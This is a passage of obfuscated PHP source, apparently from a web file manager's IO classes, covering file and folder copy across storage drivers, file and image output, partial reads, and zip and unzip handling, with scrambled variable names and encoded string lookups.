(!$‚‘Å„¦ß->exist($ˆá¸éáÍ)) { show_json(LNG($­Ç÷ó¤ã[105]), !1); } } private static function copyPath($Êèâİ¬ì, $•ëÅ¥’, $ØõÑ‹ëí, $ØĞƒ±³§, $Å£Úä±š, $ç¥Âùâ±, $¹Û˜ö£‚, $ˆÅÎÜ§ò = false, $æï»šáÒ = true) { $˜òÁò— =& $_SERVER[§ŒØóıü]; $–¤¤»æÁ = empty($ˆÅÎÜ§ò) && $ˆÅÎÜ§ò !== $˜òÁò—[198] ? $Êèâİ¬ì->pathThis($•ëÅ¥’) : $ˆÅÎÜ§ò; if ($Å£Úä±š) { $º€úÉïÈ = $ØõÑ‹ëí->fileNameExist($ØĞƒ±³§, $–¤¤»æÁ); $–ëĞ›¬æ = $–¤¤»æÁ; $–¤¤»æÁ = $ØõÑ‹ëí->fileNameAuto($ØĞƒ±³§, $–¤¤»æÁ, $Å£Úä±š, !$¹Û˜ö£‚); if (!$º€úÉïÈ || $–ëĞ›¬æ != $–¤¤»æÁ) { $Å£Úä±š = !1; } if ($æï»šáÒ && !$Å£Úä±š) { $ØõÑ‹ëí->_data[$˜òÁò—[1161]] = !0; } } if ($¹Û˜ö£‚) { return self::copyFile($Êèâİ¬ì, $•ëÅ¥’, $ØõÑ‹ëí, $ØĞƒ±³§, $–¤¤»æÁ, $ç¥Âùâ±); } if ($Å£Úä±š == REPEAT_RENAME_FOLDER) { $Å£Úä±š = !1; } $Ã‹¶ÜÜ = rtrim($ØĞƒ±³§, $˜òÁò—[8]) . $˜òÁò—[8] . $–¤¤»æÁ; $ï¿ªåõò = $ØõÑ‹ëí->mkdir($ØõÑ‹ëí->getPath($Ã‹¶ÜÜ), $Å£Úä±š); $ØĞƒ±³§ = $ØõÑ‹ëí->getPathInner($ï¿ªåõò); $ôœñôº­ = $Êèâİ¬ì->listPath($•ëÅ¥’, !0); $ôœñôº­ = is_array($ôœñôº­) ? $ôœñôº­ : array($˜òÁò—[83] => array(), $˜òÁò—[82] => array()); $üÍ´ã‹ = array_merge($ôœñôº­[$˜òÁò—[83]], $ôœñôº­[$˜òÁò—[82]]); foreach ($üÍ´ã‹ as $ï’¶Ï¾¼) { $×º€É’ = $ï’¶Ï¾¼[$˜òÁò—[33]] == $˜òÁò—[200]; $•ëÅ¥’ = $Êèâİ¬ì->getPathInner($ï’¶Ï¾¼[$˜òÁò—[84]]); $‡ãÆ†˜­ = self::copyPath($Êèâİ¬ì, $•ëÅ¥’, $ØõÑ‹ëí, $ØĞƒ±³§, $Å£Úä±š, $ç¥Âùâ±, $×º€É’, !1, !1); if (!$‡ãÆ†˜­) { IO::errorTips($˜òÁò—[1162] . $•ëÅ¥’ . $˜òÁò—[70] . $ØĞƒ±³§); } } self::copyMoveKeepInfo($Êèâİ¬ì, $•ëÅ¥’, $ï¿ªåõò); return $ï¿ªåõò; } private static function copyFile($ÊÍï±†¡, $Éƒá‰î, $¿ß—û©, $Òæı†Î£, $ØÖØ§â, $ÓöëÈÓ­) { $Æ£¸ô»¡ =& $_SERVER[§ŒØóıü]; $Òæı†Î£ = $¿ß—û©->getPath(rtrim($Òæı†Î£, $Æ£¸ô»¡[8]) . $Æ£¸ô»¡[8] . $ØÖØ§â); $€ß§ˆº = $Æ£¸ô»¡[1163] . time() . rand_string(5); Hook::trigger($Æ£¸ô»¡[1164], $ÊÍï±†¡, $Éƒá‰î, $¿ß—û©, $Òæı†Î£, $ØÖØ§â, $€ß§ˆº); if (self::driverIsSame($ÊÍï±†¡, $¿ß—û©)) { if ($ÓöëÈÓ­) { $‰íÒ²ñ² = $¿ß—û©->moveFile($Éƒá‰î, $Òæı†Î£); } else { $‰íÒ²ñ² = $¿ß—û©->copyFile($Éƒá‰î, $Òæı†Î£); } Hook::trigger($Æ£¸ô»¡[1165], $ÊÍï±†¡, $Éƒá‰î, $¿ß—û©, $Òæı†Î£, $ØÖØ§â, $‰íÒ²ñ²); self::copyMoveKeepInfo($ÊÍï±†¡, $Éƒá‰î, $‰íÒ²ñ²); return $‰íÒ²ñ²; } $ÊšÛ‹ä = TEMP_FILES; if ($GLOBALS[$Æ£¸ô»¡[6]][$Æ£¸ô»¡[89]][$Æ£¸ô»¡[802]]) { $ÊšÛ‹ä = $GLOBALS[$Æ£¸ô»¡[6]][$Æ£¸ô»¡[89]][$Æ£¸ô»¡[802]]; } $ØÒ¢£ï– = $ÊšÛ‹ä; mk_dir($ØÒ¢£ï–); $¨Şš¦İæ = $ØÒ¢£ï– . $€ß§ˆº; $³ÀÖÁ¿€ = $¨Şš¦İæ; $¨Şš¦İæ = $ÊÍï±†¡->download($Éƒá‰î, $¨Şš¦İæ); $¨Şš¦İæ = $ÊÍï±†¡->iconvApp($¨Şš¦İæ); if (substr($¨Şš¦İæ, strlen($ÊšÛ‹ä)) == $ÊšÛ‹ä) { $ÓöëÈÓ­ = !0; } $‰íÒ²ñ² = $¿ß—û©->upload($Òæı†Î£, $¨Şš¦İæ, $ÓöëÈÓ­); self::remove($³ÀÖÁ¿€); Hook::trigger($Æ£¸ô»¡[1165], $ÊÍï±†¡, $Éƒá‰î, $¿ß—û©, $Òæı†Î£, $ØÖØ§â, $‰íÒ²ñ²); self::copyMoveKeepInfo($ÊÍï±†¡, $Éƒá‰î, $‰íÒ²ñ²); return $‰íÒ²ñ²; } private static function copyMoveKeepInfo($™ò÷†ş°, $®ïˆñğ, $ÓÑÇĞ˜«) { if (!$ÓÑÇĞ˜«) { return; } $ÕşƒÊ¾ = $™ò÷†ş°->info($®ïˆñğ); if (!is_array($ÕşƒÊ¾)) { return; } IO::setModifyTime($ÓÑÇĞ˜«, $ÕşƒÊ¾[$_SERVER[§ŒØóıü][85]]); } public static function pathFather($şš´ğğÁ) { $»¢ö•œ™ = IO::init($şš´ğğÁ); $Ê¾¶“Öó = $»¢ö•œ™->pathFather($»¢ö•œ™->path); return $»¢ö•œ™->getPathOuter($Ê¾¶“Öó); } public static function fileOut($¼’–ßåÂ, $“Ñ¦Â¥Œ = false, $Éšê”‹™ = false, $ÕÚë£ÄÆ = '') { $¾ŸèÚ·‹ = self::driverMake($¼’–ßåÂ); if ($¾ŸèÚ·‹->isFileOutServer()) { return $¾ŸèÚ·‹->fileOutServer($¼’–ßåÂ, $“Ñ¦Â¥Œ, $Éšê”‹™, $ÕÚë£ÄÆ); } return $¾ŸèÚ·‹->fileOut($¼’–ßåÂ, $“Ñ¦Â¥Œ, $Éšê”‹™, $ÕÚë£ÄÆ); } public static function fileOutImage($şÊÏÛ‚¹, $ŸÂ¸Ñã³ = 250) { $»¿Á£•¿ = array(250, 600, 1200, 2000, 3000, 5000); for ($¹øíĞ¡Â = 0; $¹øíĞ¡Â < count($»¿Á£•¿); $¹øíĞ¡Â++) { if ($¹øíĞ¡Â == 0 && $ŸÂ¸Ñã³ <= $»¿Á£•¿[$¹øíĞ¡Â]) { $ŸÂ¸Ñã³ = $»¿Á£•¿[$¹øíĞ¡Â]; break; } else { if ($ŸÂ¸Ñã³ > $»¿Á£•¿[$¹øíĞ¡Â - 1] && $ŸÂ¸Ñã³ <= $»¿Á£•¿[$¹øíĞ¡Â]) { $ŸÂ¸Ñã³ = $»¿Á£•¿[$¹øíĞ¡Â]; break; } else { if ($¹øíĞ¡Â == count($»¿Á£•¿) - 1 && $ŸÂ¸Ñã³ > $»¿Á£•¿[$¹øíĞ¡Â]) { $ŸÂ¸Ñã³ = $»¿Á£•¿[$¹øíĞ¡Â]; break; } } } } $òåéî¹¼ = self::driverMake($şÊÏÛ‚¹); if ($òåéî¹¼->isFileOutServer()) { return $òåéî¹¼->fileOutImageServer($şÊÏÛ‚¹, $ŸÂ¸Ñã³); } return $òåéî¹¼->fileOutImage($şÊÏÛ‚¹, $ŸÂ¸Ñã³); } private static function driverIsSame($âƒÅ€éµ, $Áâ´—»ê) { $¬í‡âşï =& $_SERVER[§ŒØóıü]; $‰ÛíÂıë = $âƒÅ€éµ->getType(); $ÎˆÂÔ£ = $Áâ´—»ê->getType(); if ($‰ÛíÂıë != $ÎˆÂÔ£) { return !1; } if ($‰ÛíÂıë == $¬í‡âşï[763]) { return !0; } if ($‰ÛíÂıë == $¬í‡âşï[106]) { return !0; } if ($âƒÅ€éµ->pathDriver == $Áâ´—»ê->pathDriver) { return !0; } return !1; } public static function copyUpdate($½ŸÅŸ¸ƒ, $Ó–›¤¢®) { $ıŒ¤åÍğ =& $_SERVER[§ŒØóıü]; if (!IO::exist($½ŸÅŸ¸ƒ)) { return !1; } if (!IO::exist($Ó–›¤¢®)) { IO::mkdir($Ó–›¤¢®); } $¢¿¸–î = array_to_keyvalue(self::listAllSimple($½ŸÅŸ¸ƒ), $ıŒ¤åÍğ[84]); $ã×áŒ¥“ = array_to_keyvalue(self::listAllSimple($Ó–›¤¢®), $ıŒ¤åÍğ[84]); $üò†™á¿ = array(); $ñœ·¢ëé = array(); foreach ($¢¿¸–î as $õö¨§¡ => $Ëûó¢ãç) { if (isset($ã×áŒ¥“[$õö¨§¡])) { if ($Ëûó¢ãç[$ıŒ¤åÍğ[75]] == 1) { continue; } if ($ã×áŒ¥“[$õö¨§¡][$ıŒ¤åÍğ[76]] == $Ëûó¢ãç[$ıŒ¤åÍğ[76]]) { continue; } } if ($Ëûó¢ãç[$ıŒ¤åÍğ[75]] == 1) { $ñœ·¢ëé[] = $Ó–›¤¢® . $ıŒ¤åÍğ[8] . trim($õö¨§¡, $ıŒ¤åÍğ[8]); continue; } $í±Óøş¶ = strstr(trim($õö¨§¡, $ıŒ¤åÍğ[8]), $ıŒ¤åÍğ[8]) ? get_path_father($õö¨§¡) : $ıŒ¤åÍğ[12]; $üò†™á¿[] = array($ıŒ¤åÍğ[1166] => $Ëûó¢ãç[$ıŒ¤åÍğ[86]], $ıŒ¤åÍğ[1167] => rtrim($Ó–›¤¢®, $ıŒ¤åÍğ[8]) . $ıŒ¤åÍğ[8] . $í±Óøş¶, $ıŒ¤åÍğ[1168] => $Ëûó¢ãç); } $æƒÒıö = array($ıŒ¤åÍğ[200] => $üò†™á¿, $ıŒ¤åÍğ[75] => $ñœ·¢ëé); Hook::trigger($ıŒ¤åÍğ[1169], $½ŸÅŸ¸ƒ, $Ó–›¤¢®, $æƒÒıö); foreach ($ñœ·¢ëé as $Ëûó¢ãç) { IO::mkdir($Ëûó¢ãç); } foreach ($üò†™á¿ as $Ëûó¢ãç) { IO::copy($Ëûó¢ãç[$ıŒ¤åÍğ[1166]], $Ëûó¢ãç[$ıŒ¤åÍğ[1167]], REPEAT_REPLACE); } } public static function fileSubstr($æØ¼”ÂÆ, $ªÌÁ¸öª, $Ê¨®‘Ú® = false) { $ÚÅá‰ªô =& $_SERVER[§ŒØóıü]; $âªß‘Ü = self::driverMake($æØ¼”ÂÆ); $šÅÀİÉ¤ = $âªß‘Ü->size($æØ¼”ÂÆ); $Ò¡ºÑ»¢ = $ªÌÁ¸öª; $í‹åÃò¥ = $Ê¨®‘Ú®; if ($ªÌÁ¸öª < 0) { $ªÌÁ¸öª = $šÅÀİÉ¤ + $ªÌÁ¸öª; } if ($Ê¨®‘Ú® === !1) { $Ê¨®‘Ú® = $šÅÀİÉ¤ - $ªÌÁ¸öª; } if ($ªÌÁ¸öª + $Ê¨®‘Ú® > $šÅÀİÉ¤) { $Ê¨®‘Ú® = $šÅÀİÉ¤ - $ªÌÁ¸öª; } if (!$šÅÀİÉ¤ && $âªß‘Ü->getType() == $ÚÅá‰ªô[106] && !$âªß‘Ü->exist($æØ¼”ÂÆ)) { $Š­·­™£ = get_path_this($æØ¼”ÂÆ); $ô¥Õâ–÷ = parse_url_query($Š­·­™£); if (is_array($ô¥Õâ–÷) && isset($ô¥Õâ–÷[$ÚÅá‰ªô[32]])) { $Š­·­™£ = urldecode($ô¥Õâ–÷[$ÚÅá‰ªô[32]]); } throw new Exception($ÚÅá‰ªô[1170] . LNG($ÚÅá‰ªô[1171]) . $ÚÅá‰ªô[972] . clear_html($Š­·­™£) . $ÚÅá‰ªô[12]); } if ($Ê¨®‘Ú® <= 0) { return $ÚÅá‰ªô[12]; } if ($ªÌÁ¸öª < 0 || $ªÌÁ¸öª >= $šÅÀİÉ¤ || $Ê¨®‘Ú® > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\141\x64\40\145\162\x72\157\162\x21\40\x73\164\x61\162\164\x3d{$ªÌÁ¸öª}\73\x6c\145\x6e\147\x74\x68\75{$Ê¨®‘Ú®}\x3b\40\163\x69\x7a\x65\x3d{$šÅÀİÉ¤}\x3b"); } $•‡¹È»÷ = $âªß‘Ü->fileSubstr($æØ¼”ÂÆ, $ªÌÁ¸öª, $Ê¨®‘Ú®); if (!$•‡¹È»÷ && $Ê¨®‘Ú® && isset($GLOBALS[$ÚÅá‰ªô[1172]])) { throw new Exception($GLOBALS[$ÚÅá‰ªô[1172]][$ÚÅá‰ªô[1173]]); } return $•‡¹È»÷; } private static function driverMake(&$ôÁ¹ì¨) { $’§š„—‰ =& $_SERVER[§ŒØóıü]; $·ŞÜ¼¾¬ = KodIO::parse($ôÁ¹ì¨); if (!self::$driverListSystem) { $Ê¶¬×ı = Model($’§š„—‰[773])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ê¶¬×ı, $’§š„—‰[399]); } if ($·ŞÜ¼¾¬[$’§š„—‰[33]] == KodIO::KOD_IO && !self::$driverListSystem[$·ŞÜ¼¾¬[$’§š„—‰[399]]]) { return !1; } $ôÁ¹ì¨ = $·ŞÜ¼¾¬[$’§š„—‰[1174]]; $É¶ÙòÁÊ = self::driverGet($·ŞÜ¼¾¬, $ôÁ¹ì¨); return $É¶ÙòÁÊ; } private static function driverGet($†Á¢í¬, &$¹«ãñ½») { $ ·£´‹• =& $_SERVER[§ŒØóıü]; $¹˜îİÛ‡ = $†Á¢í¬[$ ·£´‹•[1175]]; $´éÄêÕƒ = $†Á¢í¬[$ ·£´‹•[399]]; switch ($†Á¢í¬[$ ·£´‹•[33]]) { case KodIO::KOD_IO: $ˆù¶Ÿ·ö = self::$driverListSystem[$´éÄêÕƒ]; break; case KodIO::KOD_SOURCE: $¹«ãñ½» = $´éÄêÕƒ . $¹«ãñ½»; $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1177], $ ·£´‹•[6] => $†Á¢í¬); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $’ñÃõŸœ = $GLOBALS[$ ·£´‹•[1178]]; self::$driverListUser = array_to_keyvalue($’ñÃõŸœ, $ ·£´‹•[399]); } $ˆù¶Ÿ·ö = self::$driverListUser[$´éÄêÕƒ]; break; case KodIO::KOD_SHARE_LINK: $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1179], $ ·£´‹•[6] => $†Á¢í¬); $è…¹˜Œì = Action($ ·£´‹•[1180])->sharePathInfo($†Á¢í¬[$ ·£´‹•[84]]); $¹«ãñ½» = $è…¹˜Œì[$ ·£´‹•[402]]; if (!$è…¹˜Œì[$ ·£´‹•[402]]) { $­ÊòñÑ  = Model($ ·£´‹•[592])->getInfo($è…¹˜Œì[$ ·£´‹•[593]]); $¹«ãñ½» = KodIO::clear($­ÊòñÑ [$ ·£´‹•[1181]] . $†Á¢í¬[$ ·£´‹•[1174]]); $†Á¢í¬[$ ·£´‹•[486]] = $­ÊòñÑ ; $†Á¢í¬[$ ·£´‹•[1157]] = $¹«ãñ½»; $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1182], $ ·£´‹•[6] => $†Á¢í¬); } break; case KodIO::KOD_SHARE_ITEM: $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1183], $ ·£´‹•[6] => $†Á¢í¬); $­ÊòñÑ  = Model($ ·£´‹•[592])->getInfo($†Á¢í¬[$ ·£´‹•[399]]); if ($­ÊòñÑ [$ ·£´‹•[402]] == $ ·£´‹•[198]) { $¹«ãñ½» = KodIO::clear($­ÊòñÑ [$ ·£´‹•[1181]] . $†Á¢í¬[$ ·£´‹•[1174]]); $†Á¢í¬[$ ·£´‹•[486]] = $­ÊòñÑ ; $†Á¢í¬[$ ·£´‹•[1157]] = $¹«ãñ½»; $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1184], $ ·£´‹•[6] => $†Á¢í¬); } else { if (!$¹«ãñ½») { $¹«ãñ½» = $­ÊòñÑ [$ ·£´‹•[402]]; } } break; default: $¹«ãñ½» = $†Á¢í¬[$ ·£´‹•[84]]; $ˆù¶Ÿ·ö = array($ ·£´‹•[1176] => $ ·£´‹•[1185]); break; } $«ÀÒ¼˜• = $†Á¢í¬[$ ·£´‹•[84]]; if (!isset(self::$driverCache[$«ÀÒ¼˜•])) { $éÔ—½ß¢ = strtolower($ˆù¶Ÿ·ö[$ ·£´‹•[95]]); $õ¼ÁŠÒÇ = $GLOBALS[$ ·£´‹•[6]][$ ·£´‹•[89]][$ ·£´‹•[832]]; $Õëö›Ñ = $ ·£´‹•[74] . (isset($õ¼ÁŠÒÇ[$éÔ—½ß¢]) ? $õ¼ÁŠÒÇ[$éÔ—½ß¢] : ucfirst($éÔ—½ß¢)); if (!class_exists($Õëö›Ñ)) { show_json("{$Õëö›Ñ}\x20\156\x6f\164\40\145\170\151\x73\x74\163\41", !1); } $±–¹¾šö = isset($ˆù¶Ÿ·ö[$ ·£´‹•[6]]) ? $ˆù¶Ÿ·ö[$ ·£´‹•[6]] : !1; self::$driverCache[$«ÀÒ¼˜•] = new $Õëö›Ñ($±–¹¾šö); } $’ßÀÊ½€ = self::$driverCache[$«ÀÒ¼˜•]; $’ßÀÊ½€->pathDriver = $¹˜îİÛ‡; $’ßÀÊ½€->pathBase = $ ·£´‹•[12]; if (isset($ˆù¶Ÿ·ö[$ ·£´‹•[6]][$ ·£´‹•[1186]])) { $’ßÀÊ½€->pathBase = rtrim($ˆù¶Ÿ·ö[$ ·£´‹•[6]][$ ·£´‹•[1186]], $ ·£´‹•[8]) . $ ·£´‹•[8]; $¹«ãñ½» = $’ßÀÊ½€->pathBase . ltrim($¹«ãñ½», $ ·£´‹•[8]); } $¹«ãñ½» = $’ßÀÊ½€->getPath($¹«ãñ½»); if (isset($†Á¢í¬[$ ·£´‹•[1157]])) { $¹«ãñ½» = $†Á¢í¬[$ ·£´‹•[1157]]; } $’ßÀÊ½€->path = $¹«ãñ½»; return $’ßÀÊ½€; } public static function errorTips($†›©çîä = false) { $‰Öïåê› =& $_SERVER[§ŒØóıü]; static $ğèêµ¿Ò = array(); $Ã­ğ­ó× = 1000; if ($†›©çîä === -1) { return $ğèêµ¿Ò ? $ğèêµ¿Ò[count($ğèêµ¿Ò) - 1] : $‰Öïåê›[12]; } if ($†›©çîä === !1) { return implode($‰Öïåê›[231], $ğèêµ¿Ò); } if (count($ğèêµ¿Ò) >= $Ã­ğ­ó×) { $ğèêµ¿Ò = array_slice($ğèêµ¿Ò, $Ã­ğ­ó× * 0.5, $Ã­ğ­ó×); } $ğèêµ¿Ò[] = $†›©çîä; write_log($‰Öïåê›[162] . ACTION . $‰Öïåê›[1187] . $†›©çîä, $‰Öïåê›[1188]); } public static function getLastError($î—Œ¼Èí = '') { $²Ó°Œ‰’ = self::errorTips(-1); return $²Ó°Œ‰’ ? $²Ó°Œ‰’ : $î—Œ¼Èí; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $„åÕíüô; if ($„åÕíüô) { return $„åÕíüô; } $±Á¢¥í = IO::init($_SERVER[§ŒØóıü][8]); return $±Á¢¥í; } private static function iconvSystem($«Ú”Ä°Õ) { return self::local()->iconvSystem($«Ú”Ä°Õ); } private static function iconvApp($Ù°ñŠ½) { return self::local()->iconvApp($Ù°ñŠ½); } public static function zipFolder($Å½Á½·Á, $çÀÌ…Ïü = "\x7a\x69\160", $Ğ©ç¡¸ = '', $Ë×§Ì–í = REPEAT_RENAME) { $Íû×­È =& $_SERVER[§ŒØóıü]; $Ûóñ¾› = IO::listPath($Å½Á½·Á); if (!$Ûóñ¾›) { return !1; } $Ûóñ¾› = array_merge($Ûóñ¾›[$Íû×­È[82]], $Ûóñ¾›[$Íû×­È[83]]); return self::zip($Ûóñ¾›, $çÀÌ…Ïü, $Ğ©ç¡¸, $Ë×§Ì–í); } public static function zip($ìİşë, $Í¶ñùÂ¾ = "\x7a\151\x70", $´·Ö«‹ = '', $×£”Öå“ = REPEAT_RENAME) { $œèÏÏÂü =& $_SERVER[§ŒØóıü]; if (is_string($ìİşë) && $ìİşë) { $ìİşë = array(array($œèÏÏÂü[84] => $ìİşë)); } $ì»£¹¥¡ = self::init($ìİşë[0][$œèÏÏÂü[84]]); $İ”º¦®ç = self::info($ìİşë[0][$œèÏÏÂü[84]]); $¦¹ÂÅ¸Í = $œèÏÏÂü[12]; $²ªô—ÙŠ = $œèÏÏÂü[12]; $‚ƒˆãà¸ = $œèÏÏÂü[12]; if ($´·Ö«‹ && substr($´·Ö«‹, -1, 1) != $œèÏÏÂü[8]) { $²ªô—ÙŠ = get_path_father($´·Ö«‹); $‚ƒˆãà¸ = get_path_this($´·Ö«‹); } else { $²ªô—ÙŠ = self::pathFather($İ”º¦®ç[$œèÏÏÂü[84]]); $‚ƒˆãà¸ = $İ”º¦®ç[$œèÏÏÂü[32]] . $œèÏÏÂü[10] . $Í¶ñùÂ¾; if (count($ìİşë) > 1) { $÷Áõ¼ü¬ = IO::info($²ªô—ÙŠ); $‚ƒˆãà¸ = $÷Áõ¼ü¬[$œèÏÏÂü[32]] . $œèÏÏÂü[10] . $Í¶ñùÂ¾; } if ($´·Ö«‹) { $²ªô—ÙŠ = $´·Ö«‹; } } if ($ì»£¹¥¡->getType() == $œèÏÏÂü[106]) { $Ä÷ˆƒ× = self::init($²ªô—ÙŠ); $—†àÙóË = $Ä÷ˆƒ×->getType() == $œèÏÏÂü[106] ? $²ªô—ÙŠ : get_path_father($ì»£¹¥¡->path); $—†àÙóË = rtrim($—†àÙóË, $œèÏÏÂü[8]) . $œèÏÏÂü[8]; mk_dir($—†àÙóË); } else { $¦¹ÂÅ¸Í = TEMP_FILES . $œèÏÏÂü[1189] . time() . rand_string(8) . $œèÏÏÂü[8]; mk_dir($¦¹ÂÅ¸Í); file_put_contents($¦¹ÂÅ¸Í . $œèÏÏÂü[1190], $œèÏÏÂü[12]); $—†àÙóË = $¦¹ÂÅ¸Í; } $ÑèÒĞœ = IO::info($—†àÙóË); if (!$ÑèÒĞœ || !$ÑèÒĞœ[$œèÏÏÂü[203]]) { show_json(LNG($œèÏÏÂü[1191]), !1); } $’»‰œ‘ä = self::zipFileList($ìİşë, $¦¹ÂÅ¸Í); foreach ($’»‰œ‘ä as $ã×ŸĞ¬ => $†Ù¨²ùø) { $’»‰œ‘ä[$ã×ŸĞ¬] = self::iconvSystem($†Ù¨²ùø); } $öè±¹Îø = get_filename_auto($—†àÙóË . $‚ƒˆãà¸, $œèÏÏÂü[12], $×£”Öå“); KodArchive::create(self::iconvSystem($öè±¹Îø), $’»‰œ‘ä); if (!IO::exist($öè±¹Îø)) { if ($¦¹ÂÅ¸Í) { del_dir($¦¹ÂÅ¸Í); } show_json(LNG($œèÏÏÂü[1192]), !1); } if (!$¦¹ÂÅ¸Í) { return $öè±¹Îø; } $¸É·¸Éû = self::move($öè±¹Îø, $²ªô—ÙŠ, $×£”Öå“); if ($¦¹ÂÅ¸Í) { del_dir($¦¹ÂÅ¸Í); } if (!$öè±¹Îø) { show_json(LNG($œèÏÏÂü[1192]), !1); } return $¸É·¸Éû; } public static function unzip($°©ÔÁâá, $êğÂ¬…ö, $Ô‚Š˜„´ = "\55\61", $÷¡ã‘«· = "\x72\145\160\x6c\x61\143\x65") { $ğåøÇşÜ =& $_SERVER[§ŒØóıü]; $­ÄŸ­ŒÖ = parent::info($°©ÔÁâá); if (!$­ÄŸ­ŒÖ) { show_json(LNG($ğåøÇşÜ[1193]), !1); } $÷Ë ´×Õ = IO::infoFull($êğÂ¬…ö); if (!$÷Ë ´×Õ) { $êğÂ¬…ö = IO::mkdir($êğÂ¬…ö); } if (isset($÷Ë ´×Õ[$ğåøÇşÜ[402]]) && trim($÷Ë ´×Õ[$ğåøÇşÜ[84]], $ğåøÇşÜ[8]) != trim($êğÂ¬…ö, $ğåøÇşÜ[8])) { $ªÏúÙÔ¶ = KodIO::make($÷Ë ´×Õ[$ğåøÇşÜ[432]]); $ ä»Ü“Š = IO::fileNameAuto($ªÏúÙÔ¶, $÷Ë ´×Õ[$ğåøÇşÜ[32]], REPEAT_RENAME_FOLDER, !0); $êğÂ¬…ö = IO::mkdir($ªÏúÙÔ¶ . $ ä»Ü“Š); } $Ô‚Š˜„´ = $Ô‚Š˜„´ && $Ô‚Š˜„´ != $ğåøÇşÜ[1194] ? @json_decode($Ô‚Š˜„´, !0) : -1; $ö²ñë• = self::unzipPart($°©ÔÁâá, $Ô‚Š˜„´); if (!$ö²ñë• || !IO::exist($ö²ñë•[$ğåøÇşÜ[200]])) { show_json(LNG($ğåøÇşÜ[105]), !1); } $Ú¬Èç§í = $ö²ñë•[$ğåøÇşÜ[1195]][count($ö²ñë•[$ğåøÇşÜ[1195]]) - 1]; if ($Ú¬Èç§í[$ğåøÇşÜ[1196]] == -1 || substr($Ú¬Èç§í[$ğåøÇşÜ[32]], -1, 1) == $ğåøÇşÜ[8]) { $¦ÔßêÔ¶ = $ö²ñë•[$ğåøÇşÜ[1197]] . rand_string(10) . $ğåøÇşÜ[8]; mk_dir($¦ÔßêÔ¶); $£Ê“òÒ³ = count($ö²ñë•[$ğåøÇşÜ[1195]]) == 1 ? IO::ext($°©ÔÁâá) : get_path_ext($ö²ñë•[$ğåøÇşÜ[200]]); $Ğ²âˆÊÂ = KodArchive::extract(self::iconvSystem($ö²ñë•[$ğåøÇşÜ[200]]), $¦ÔßêÔ¶, $Ú¬Èç§í[$ğåøÇşÜ[1196]], $ ä»Ü“Š, $£Ê“òÒ³); self::unzipErrorCheck($Ğ²âˆÊÂ, array($ğåøÇşÜ[1198], $°©ÔÁâá, $£Ê“òÒ³, $êğÂ¬…ö, $ö²ñë•)); Hook::trigger($ğåøÇşÜ[1199], $¦ÔßêÔ¶); recursion_dir($¦ÔßêÔ¶, $–´õ¸—¬, $Ñé¸ÃÃñ, 0); $†­ÚÀ–á = array_merge($–´õ¸—¬, $Ñé¸ÃÃñ); $†öà¼» = array(); foreach ($†­ÚÀ–á as $ş¹’âæ) { $¨ÍöË£ú = IO::move(self::iconvApp($ş¹’âæ), $êğÂ¬…ö, $÷¡ã‘«·); if ($¨ÍöË£ú) { $†öà¼»[] = $¨ÍöË£ú; } } del_dir($¦ÔßêÔ¶); } else { $¨ÍöË£ú = IO::move($ö²ñë•[$ğåøÇşÜ[200]], $êğÂ¬…ö, $÷¡ã‘«·, get_path_this($Ú¬Èç§í[$ğåøÇşÜ[32]])); if ($¨ÍöË£ú) { $†öà¼»[] = $¨ÍöË£ú; } } return $†öà¼» ? $†öà¼» : !1; } public static function unzipList($•¦ÙçÒİ) { $ÄÁİ¬¥Õ =& $_SERVER[§ŒØóıü]; $Í‚÷ÓÀ… = isset($•¦ÙçÒİ[$ÄÁİ¬¥Õ[1200]]) ? $•¦ÙçÒİ[$ÄÁİ¬¥Õ[1200]] : !1; $ĞÂˆŒ†À = isset($•¦ÙçÒİ[$ÄÁİ¬¥Õ[1196]]) ? @json_decode($•¦ÙçÒİ[$ÄÁİ¬¥Õ[1196]], !0) : -1; $¹µ½¡ü = self::unzipPart($•¦ÙçÒİ[$ÄÁİ¬¥Õ[84]], $ĞÂˆŒ†À); if (!$¹µ½¡ü || !IO::exist($¹µ½¡ü[$ÄÁİ¬¥Õ[200]])) { show_json(LNG($ÄÁİ¬¥Õ[105]), !1); } $Œª‡²Ñ½ = $¹µ½¡ü[$ÄÁİ¬¥Õ[1195]][count($¹µ½¡ü[$ÄÁİ¬¥Õ[1195]]) - 1]; $†˜’ƒÍŸ = in_array(IO::ext($¹µ½¡ü[$ÄÁİ¬¥Õ[200]]), array($ÄÁİ¬¥Õ[313], $ÄÁİ¬¥Õ[1201], $ÄÁİ¬¥Õ[1202], $ÄÁİ¬¥Õ[1203], $ÄÁİ¬¥Õ[1204], $ÄÁİ¬¥Õ[1205])); if (!$Í‚÷ÓÀ… && ($Œª‡²Ñ½[$ÄÁİ¬¥Õ[1196]] == -1 || $†˜’ƒÍŸ)) { $’ıŞ±¨ = $¹µ½¡ü[$ÄÁİ¬¥Õ[1197]] . get_path_this($¹µ½¡ü[$ÄÁİ¬¥Õ[200]]) . $ÄÁİ¬¥Õ[1206]; if (!IO::exist($’ıŞ±¨)) { $èê½á‘È = $Œª‡²Ñ½[$ÄÁİ¬¥Õ[1196]] == -1 ? get_path_ext(IO::pathThis($•¦ÙçÒİ[$ÄÁİ¬¥Õ[84]])) : get_path_ext($¹µ½¡ü[$ÄÁİ¬¥Õ[200]]); $Æ¢ìÔöÇ = KodArchive::listContent(self::iconvSystem($¹µ½¡ü[$ÄÁİ¬¥Õ[200]]), !0, $èê½á‘È); self::unzipErrorCheck($Æ¢ìÔöÇ, array($ÄÁİ¬¥Õ[1207], $•¦ÙçÒİ, $¹µ½¡ü)); @file_put_contents($’ıŞ±¨, json_encode($Æ¢ìÔöÇ[$ÄÁİ¬¥Õ[1208]])); } return @json_decode(IO::getContent($’ıŞ±¨), !0); } IO::fileOut($¹µ½¡ü[$ÄÁİ¬¥Õ[200]], $Í‚÷ÓÀ…, get_path_this($Œª‡²Ñ½[$ÄÁİ¬¥Õ[32]])); die; } private static function zipFileList($äØùŠ, $é€¤øÌ· = false) { $Ø®âöÑ¿ =& $_SERVER[§ŒØóıü]; $½’ÜĞ”Û = array(); foreach 